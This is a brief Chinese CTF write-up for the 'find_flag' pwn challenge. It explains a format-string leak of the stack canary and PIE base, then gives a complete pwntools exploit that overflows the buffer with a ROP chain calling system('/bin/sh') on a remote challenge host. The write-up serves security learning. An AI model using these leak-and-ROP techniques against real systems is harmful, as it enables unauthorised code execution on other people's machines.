[[深育杯 2021]find_flag | NSSCTF](https://www.nssctf.cn/problem/774)
![[Pasted image 20240901103105.png]]
开启Canary与PIE
![[Pasted image 20240901103623.png]]
重点函数为此，中间一坨在别的地方看到为`strcat(v3, '!\n')`,阻止了直接泄露，需计算偏移
![[Pasted image 20240901104310.png]]
![[Pasted image 20240901104331.png]]
计算出偏移为17
同时，开启了栈随机化(PIE)，此处可同时泄露出栈基地址
![[Pasted image 20240901104508.png]]
对应的偏移为0x146F
exp:
```python
from pwn import *
import pwnlib.gdb

context(arch='amd64', os='linux', log_level='debug')

local = True

elf = ELF('./find_flag')
if local:
    p = process('./find_flag')
    pwnlib.gdb.attach(p, 'b* $rebase(0x13F9)')
else:
    p = remote("node4.anna.nssctf.cn", 28277)

offset = 0x68

# p.recvuntil('name?')
p.sendlineafter(b"name?", b"%17$p---%19$p")
p.recvuntil('you, ')
canary = int(p.recv(18), 16)
print('canary:', hex(canary))

p.recvuntil('---')
base_addr = int(p.recv(14), 16) - 0x146F

binsh = base_addr + 0x2004
system = base_addr + elf.symbols['system']

ret = base_addr + 0x101a
rdi = base_addr + 0x14e3

payload = b'a' *(0x40 - 8) + p64(canary) + b'a' * 8 + p64(ret) + p64(rdi) + p64(binsh) + p64(system)

p.sendlineafter("else? ", payload)

p.interactive()
```
